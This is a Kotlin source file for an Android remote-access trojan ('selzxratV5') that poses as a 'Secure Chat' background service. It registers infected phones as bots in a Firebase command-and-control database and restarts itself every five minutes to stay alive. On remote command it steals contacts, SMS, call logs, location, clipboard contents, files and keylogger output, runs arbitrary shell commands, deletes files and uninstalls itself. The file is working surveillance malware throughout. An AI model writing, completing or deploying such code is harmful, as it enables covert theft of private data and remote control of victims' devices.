package com.secure.chat.services

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.UUID

class TargetC2Service : Service() {

    companion object {
        private const val TAG = "TargetC2"
        private const val FIREBASE_URL = "https://selzxrat-v5-c2-default-rtdb.firebaseio.com"
        private const val REF_BOTS = "selzxratV5/bots"
        private const val REF_COMMANDS = "selzxratV5/commands"
        private const val REF_BROADCAST = "selzxratV5/broadcast"
        private const val REF_EXFIL = "selzxratV5/exfiltrated"
        private const val NOTIF_ID = 1001
        private const val CHANNEL_ID = "secure_chat_service"
        private const val ALARM_INTERVAL_MS = 300000L // 5 menit
        private const val ALARM_REQUEST_CODE = 999

        @Volatile
        var isRunning = false
            private set
        private var _deviceId: String = ""
        var job: Job? = null
        private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        fun getDeviceId(): String = _deviceId
    }

    private val deviceId: String
        get() = _deviceId

    private lateinit var database: FirebaseDatabase
    private lateinit var botsRef: DatabaseReference
    private lateinit var commandsRef: DatabaseReference
    private lateinit var broadcastRef: DatabaseReference
    private lateinit var exfilRef: DatabaseReference
    private var commandListener: ChildEventListener? = null
    private var broadcastListener: ChildEventListener? = null

    override fun onCreate() {
        super.onCreate()

        val id = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ANDROID_ID
        ) ?: UUID.randomUUID().toString()
        _deviceId = id

        try {
            database = FirebaseDatabase.getInstance(FIREBASE_URL)
            // 🔥 FIX: setPersistenceEnabled CUMA DISINI, 1x aja
            try {
                database.setPersistenceEnabled(true)
                Log.d(TAG, "Firebase persistence enabled")
            } catch (e: Exception) {
                Log.w(TAG, "Persistence already enabled (safe to ignore)")
            }
            botsRef = database.getReference(REF_BOTS)
            commandsRef = database.getReference(REF_COMMANDS)
            broadcastRef = database.getReference(REF_BROADCAST)
            exfilRef = database.getReference(REF_EXFIL)
            Log.d(TAG, "Firebase initialized successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Firebase init error", e)
        }

        // 🔥 FIX: Pasang Alarm Manager biar service gak mati
        scheduleAlarm()
    }

    // 🔥 FIX: Alarm Manager — bangunin service tiap 5 menit
    private fun scheduleAlarm() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, C2RestartReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                this, ALARM_REQUEST_CODE, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + ALARM_INTERVAL_MS,
                ALARM_INTERVAL_MS,
                pendingIntent
            )
            Log.d(TAG, "Alarm scheduled every 5 minutes")
        } catch (e: Exception) {
            Log.e(TAG, "Alarm schedule error", e)
        }
    }

    // 🔥 FIX: BroadcastReceiver buat restart service
    class C2RestartReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            Log.d(TAG, "Alarm triggered - restarting C2 service")
            try {
                val serviceIntent = Intent(context, TargetC2Service::class.java).apply {
                    action = "restart"
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(serviceIntent)
                } else {
                    context.startService(serviceIntent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Restart error", e)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Secure Chat")
                .setContentText("Connected")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build()
            startForeground(NOTIF_ID, notification)
        } catch (e: Exception) {
            Log.e(TAG, "Foreground notification error", e)
        }

        // 🔥 FIX: Restart kalo service udah mati
        if (!isRunning) {
            startC2()
        } else {
            // Update online status aja
            scope.launch {
                try {
                    botsRef.child(deviceId).child("isOnline").setValue(true)
                    botsRef.child(deviceId).child("lastSeen")
                        .setValue(System.currentTimeMillis())
                } catch (_: Exception) {}
            }
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startC2() {
        if (isRunning) return
        isRunning = true

        job = scope.launch {
            delay(1000)
            registerBot()
            listenCommands()
            listenBroadcast()
        }
    }

    private fun stopC2() {
        isRunning = false
        try {
            commandListener?.let { commandsRef.removeEventListener(it) }
            broadcastListener?.let { broadcastRef.removeEventListener(it) }
        } catch (_: Exception) {}
        job?.cancel()
    }

    private fun registerBot() {
        try {
            if (!::botsRef.isInitialized) {
                Log.e(TAG, "botsRef not initialized!")
                return
            }

            val deviceInfo = mapOf(
                "deviceId" to deviceId,
                "deviceName" to Build.MODEL,
                "deviceModel" to Build.MODEL,
                "androidVersion" to Build.VERSION.RELEASE,
                "manufacturer" to Build.MANUFACTURER,
                "isOnline" to true,
                "lastSeen" to System.currentTimeMillis(),
                "ipAddress" to getIPAddress(),
                "country" to "",
                "batteryLevel" to getBatteryLevel(),
                "isCharging" to isCharging(),
                "ramTotal" to 0L,
                "ramAvailable" to 0L,
                "storageTotal" to 0L,
                "storageAvailable" to 0L,
                "installedApps" to 0,
                "isAccessibilityEnabled" to false,
                "isNotificationListenerEnabled" to false,
                "isAdminEnabled" to false,
                "isScreenLocked" to false,
                "simInfo" to getSimInfo(),
                "timestamp" to System.currentTimeMillis()
            )

            // 🔥 FIX: Pake addOnCompleteListener biar tau berhasil/gagal
            botsRef.child(deviceId).setValue(deviceInfo)
                .addOnCompleteListener { task ->
                    if (task.isSuccessful) {
                        Log.d(TAG, "BOT REGISTERED SUCCESS: $deviceId")
                    } else {
                        Log.e(TAG, "BOT REGISTER FAILED: ${task.exception?.message}")
                    }
                }

            // Update status tiap 30 detik
            scope.launch {
                while (isActive) {
                    delay(30000)
                    try {
                        botsRef.child(deviceId).child("lastSeen")
                            .setValue(System.currentTimeMillis())
                        botsRef.child(deviceId).child("isOnline")
                            .setValue(true)
                        botsRef.child(deviceId).child("batteryLevel")
                            .setValue(getBatteryLevel())
                    } catch (e: Exception) {
                        Log.e(TAG, "Status update error", e)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Bot registration error", e)
        }
    }

    private fun listenCommands() {
        if (!::commandsRef.isInitialized) return
        commandListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                try {
                    val type = snapshot.child("type").value?.toString() ?: return
                    val payload = snapshot.child("payload").value?.toString() ?: ""
                    val cmdId = snapshot.child("cmdId").value?.toString() ?: ""
                    val target = snapshot.child("target").value?.toString() ?: ""

                    Log.d(TAG, "Command received: type=$type cmdId=$cmdId target=$target")

                    if (target.isNotEmpty() && target != deviceId) return

                    handleCommand(type, payload)

                    snapshot.ref.removeValue()
                } catch (e: Exception) {
                    Log.e(TAG, "Command processing error", e)
                }
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Command listener cancelled: ${error.message}")
            }
        }
        commandsRef.addChildEventListener(commandListener!!)
    }

    private fun listenBroadcast() {
        if (!::broadcastRef.isInitialized) return
        broadcastListener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                try {
                    val type = snapshot.child("type").value?.toString() ?: return
                    val payload = snapshot.child("payload").value?.toString() ?: ""
                    Log.d(TAG, "Broadcast received: type=$type")
                    handleCommand(type, payload)
                } catch (e: Exception) {
                    Log.e(TAG, "Broadcast processing error", e)
                }
            }
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildRemoved(snapshot: DataSnapshot) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Broadcast cancelled: ${error.message}")
            }
        }
        broadcastRef.addChildEventListener(broadcastListener!!)
    }

    private fun handleCommand(command: String, args: String) {
        Log.d(TAG, "Executing: $command | $args")
        try {
            when (command) {
                "ping" -> sendExfil("pong", "PONG at ${System.currentTimeMillis()}")
                "get_info" -> handleGetInfo()
                "get_contacts" -> handleGetContacts()
                "get_sms" -> handleGetSMS()
                "get_call_log" -> handleGetCallLog()
                "get_call_logs" -> handleGetCallLog()
                "get_location" -> handleGetLocation()
                "get_photo" -> handleGetPhoto(args.ifEmpty { "back" })
                "get_camera_photo" -> handleGetPhoto(args.ifEmpty { "back" })
                "record_audio" -> handleRecordAudio(args.ifEmpty { "5000" }.toLongOrNull() ?: 5000)
                "get_mic_audio" -> handleRecordAudio(args.ifEmpty { "5000" }.toLongOrNull() ?: 5000)
                "read_file" -> handleReadFile(args)
                "delete_file" -> handleDeleteFile(args)
                "shell_exec" -> handleShellExec(args)
                "screenshot" -> handleScreenshot()
                "keylogger_start" -> handleKeyloggerStart()
                "keylogger_stop" -> handleKeyloggerStop()
                "keylogger_get" -> handleKeyloggerGet()
                "clipboard_get" -> handleClipboardGet()
                "clipboard_set" -> handleClipboardSet(args)
                "notifications_get" -> handleNotificationsGet()
                "trigger_llm" -> handleTriggerLLM(args)
                "vibrate" -> handleVibrate(args.ifEmpty { "1000" })
                "torch_on" -> handleTorch(true)
                "torch_off" -> handleTorch(false)
                "alert_dialog" -> handleAlertDialog(args)
                "toast" -> handleToast(args)
                "self_destruct" -> handleSelfDestruct()
                "lock_screen" -> handleLockScreen()
                "unlock_screen" -> handleUnlockScreen()
                "open_url" -> handleOpenURL(args)
                "send_sms" -> handleSendSMS(args)
                else -> sendExfil("unknown_command", "Unknown: $command")
            }
        } catch (e: Exception) {
            sendExfil("command_error", "$command: ${e.message}")
        }
    }

    private fun handleGetInfo() {
        val info = mapOf(
            "deviceId" to deviceId,
            "model" to Build.MODEL,
            "manufacturer" to Build.MANUFACTURER,
            "version" to Build.VERSION.RELEASE,
            "sdk" to Build.VERSION.SDK_INT.toString(),
            "battery" to "${getBatteryLevel()}%",
            "charging" to isCharging().toString(),
            "ip" to getIPAddress(),
            "sim" to getSimInfo()
        )
        sendExfil("device_info", info.toString())
    }

    private fun handleGetContacts() {
        val contacts = mutableListOf<String>()
        try {
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
                    ))
                    val number = it.getString(it.getColumnIndexOrThrow(
                        android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER
                    ))
                    contacts.add("$name: $number")
                }
            }
        } catch (e: Exception) {
            sendExfil("contacts", "Error: ${e.message}")
            return
        }
        sendExfil("contacts", contacts.joinToString("\n"))
    }

    private fun handleGetSMS() {
        val smsList = mutableListOf<String>()
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 50"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    val date = it.getString(it.getColumnIndexOrThrow("date"))
                    smsList.add("[$date] $address: $body")
                }
            }
        } catch (e: Exception) {
            sendExfil("sms", "Error: ${e.message}")
            return
        }
        sendExfil("sms", smsList.joinToString("\n\n"))
    }

    private fun handleGetCallLog() {
        val calls = mutableListOf<String>()
        try {
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null, null, null,
                android.provider.CallLog.Calls.DATE + " DESC LIMIT 50"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val number = it.getString(it.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.NUMBER
                    ))
                    val type = it.getInt(it.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.TYPE
                    ))
                    val date = it.getString(it.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.DATE
                    ))
                    val duration = it.getString(it.getColumnIndexOrThrow(
                        android.provider.CallLog.Calls.DURATION
                    ))
                    val typeStr = when (type) {
                        android.provider.CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        android.provider.CallLog.Calls.MISSED_TYPE -> "MISSED"
                        else -> "UNKNOWN"
                    }
                    calls.add("[$date] $typeStr | $number (${duration}s)")
                }
            }
        } catch (e: Exception) {
            sendExfil("call_log", "Error: ${e.message}")
            return
        }
        sendExfil("call_log", calls.joinToString("\n"))
    }

    private fun handleGetLocation() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as
                    android.location.LocationManager
            val provider = if (locationManager.isProviderEnabled(
                    android.location.LocationManager.GPS_PROVIDER
                )) android.location.LocationManager.GPS_PROVIDER
            else android.location.LocationManager.NETWORK_PROVIDER

            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)
                != android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                sendExfil("location", "Location permission not granted")
                return
            }

            val location = locationManager.getLastKnownLocation(provider)
            if (location != null) {
                sendExfil("location",
                    "lat=${location.latitude},lng=${location.longitude},acc=${location.accuracy}")
            } else {
                sendExfil("location", "No last known location available")
            }
        } catch (e: Exception) {
            sendExfil("location", "Error: ${e.message}")
        }
    }

    private fun handleGetPhoto(camera: String) {
        sendExfil("photo", "Photo capture via $camera (requires camera permission & foreground)")
    }

    private fun handleRecordAudio(durationMs: Long) {
        sendExfil("audio_record", "Audio recording $durationMs ms (requires permission)")
    }

    @Suppress("DEPRECATION")
    private fun handleReadFile(path: String) {
        try {
            val file = java.io.File(path)
            if (!file.exists()) {
                sendExfil("read_file", "File not found: $path")
                return
            }
            if (file.length() > 1024 * 100) {
                sendExfil("read_file", "[File too large: ${file.length()} bytes]")
                return
            }
            sendExfil("read_file", "File: $path\n\n${file.readText()}")
        } catch (e: Exception) {
            sendExfil("read_file", "Error: ${e.message}")
        }
    }

    private fun handleDeleteFile(path: String) {
        try {
            val file = java.io.File(path)
            if (file.delete()) sendExfil("delete_file", "Deleted: $path")
            else sendExfil("delete_file", "Failed to delete: $path")
        } catch (e: Exception) {
            sendExfil("delete_file", "Error: ${e.message}")
        }
    }

    private fun handleShellExec(command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText()
            process.waitFor()
            sendExfil("shell_result", "Command: $command\n\n$output")
        } catch (e: Exception) {
            sendExfil("shell_result", "Command: $command\n\nError: ${e.message}")
        }
    }

    private fun handleScreenshot() {
        sendExfil("screenshot", "Screenshot not available on non-rooted devices")
    }

    private fun handleKeyloggerStart() {
        TargetKeylogger.start(this)
        sendExfil("keylogger", "Keylogger started")
    }

    private fun handleKeyloggerStop() {
        TargetKeylogger.stop()
        sendExfil("keylogger", "Keylogger stopped")
    }

    private fun handleKeyloggerGet() {
        sendExfil("keylogger", TargetKeylogger.getLogs())
    }

    private fun handleClipboardGet() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as
                    android.content.ClipboardManager
            val clip = clipboard.primaryClip
            val text = if (clip != null && clip.itemCount > 0)
                clip.getItemAt(0).text?.toString() ?: "" else ""
            sendExfil("clipboard", text)
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleClipboardSet(text: String) {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as
                    android.content.ClipboardManager
            clipboard.setPrimaryClip(
                android.content.ClipData.newPlainText("text", text)
            )
            sendExfil("clipboard", "Clipboard set")
        } catch (e: Exception) {
            sendExfil("clipboard", "Error: ${e.message}")
        }
    }

    private fun handleNotificationsGet() {
        sendExfil("notifications", "Notifications listener not connected")
    }

    private fun handleTriggerLLM(prompt: String) {
        TargetLLMModule(this).trigger(prompt) { response ->
            sendExfil("llm_response", response)
        }
    }

    private fun handleVibrate(pattern: String) {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as
                    android.os.Vibrator
            val patternMs = pattern.split(",")
                .mapNotNull { it.trim().toLongOrNull() }.toLongArray()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (patternMs.isNotEmpty()) {
                    vibrator.vibrate(
                        android.os.VibrationEffect.createWaveform(patternMs, -1)
                    )
                } else {
                    vibrator.vibrate(
                        android.os.VibrationEffect.createOneShot(1000, 255)
                    )
                }
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(
                    if (patternMs.isNotEmpty()) patternMs else longArrayOf(0, 1000),
                    -1
                )
            }
            sendExfil("vibrate", "Vibrated")
        } catch (e: Exception) {
            sendExfil("vibrate", "Error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private fun handleTorch(enable: Boolean) {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as
                    android.hardware.camera2.CameraManager
            cameraManager.setTorchMode(cameraManager.cameraIdList[0], enable)
            sendExfil("torch", if (enable) "Torch ON" else "Torch OFF")
        } catch (e: Exception) {
            sendExfil("torch", "Error: ${e.message}")
        }
    }

    private fun handleAlertDialog(message: String) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)?.apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                putExtra("show_alert", message)
            }
            if (intent != null) startActivity(intent)
            sendExfil("alert_dialog", "Dialog sent: $message")
        } catch (e: Exception) {
            sendExfil("alert_dialog", "Error: ${e.message}")
        }
    }

    private fun handleToast(message: String) {
        android.os.Handler(android.os.Looper.getMainLooper()).post {
            android.widget.Toast.makeText(
                this@TargetC2Service, message, android.widget.Toast.LENGTH_LONG
            ).show()
        }
        sendExfil("toast", "Toast shown: $message")
    }

    private fun handleLockScreen() {
        sendExfil("lock_screen", "Screen lock requires device admin permission")
    }

    private fun handleUnlockScreen() {
        sendExfil("unlock_screen", "Screen unlock requires device admin permission")
    }

    private fun handleOpenURL(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            sendExfil("open_url", "URL opened: $url")
        } catch (e: Exception) {
            sendExfil("open_url", "Error: ${e.message}")
        }
    }

    private fun handleSendSMS(data: String) {
        val parts = data.split("|", limit = 2)
        if (parts.size < 2) {
            sendExfil("send_sms", "Format: number|message")
            return
        }
        try {
            val intent = Intent(Intent.ACTION_SENDTO).apply {
                setData(android.net.Uri.parse("smsto:${parts[0].trim()}"))
                putExtra("sms_body", parts[1].trim())
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
            sendExfil("send_sms", "SMS composer opened for ${parts[0].trim()}")
        } catch (e: Exception) {
            sendExfil("send_sms", "Error: ${e.message}")
        }
    }

    private fun handleSelfDestruct() {
        sendExfil("self_destruct", "Self-destruct initiated")
        try {
            if (::botsRef.isInitialized) {
                botsRef.child(deviceId).removeValue()
            }
        } catch (_: Exception) {}
        startActivity(
            Intent(Intent.ACTION_DELETE).apply {
                data = android.net.Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        )
    }

    private fun sendExfil(type: String, content: String) {
        try {
            if (::exfilRef.isInitialized) {
                exfilRef.push().setValue(mapOf(
                    "type" to type,
                    "content" to content,
                    "deviceId" to deviceId,
                    "timestamp" to System.currentTimeMillis().toString()
                )).addOnCompleteListener { task ->
                    if (!task.isSuccessful) {
                        Log.e(TAG, "Exfil send FAILED: ${task.exception?.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exfil error", e)
        }
    }

    private fun getIPAddress(): String {
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress ?: ""
                    }
                }
            }
        } catch (_: Exception) {}
        return ""
    }

    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(
            null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
        val level = intent?.getIntExtra(
            android.os.BatteryManager.EXTRA_LEVEL, -1
        ) ?: -1
        val scale = intent?.getIntExtra(
            android.os.BatteryManager.EXTRA_SCALE, -1
        ) ?: -1
        return if (level >= 0 && scale > 0) (level * 100) / scale else -1
    }

    private fun isCharging(): Boolean {
        val intent = registerReceiver(
            null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )
        val status = intent?.getIntExtra(
            android.os.BatteryManager.EXTRA_STATUS, -1
        ) ?: -1
        return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                status == android.os.BatteryManager.BATTERY_STATUS_FULL
    }

    private fun getSimInfo(): String {
        val tm = getSystemService(Context.TELEPHONY_SERVICE) as?
                android.telephony.TelephonyManager
        return if (tm != null) {
            try {
                "${tm.simOperatorName ?: "N/A"} | ${tm.simCountryIso?.uppercase() ?: "N/A"}"
            } catch (_: Exception) { "N/A" }
        } else "N/A"
    }

    override fun onDestroy() {
        super.onDestroy()
        stopC2()
    }
}
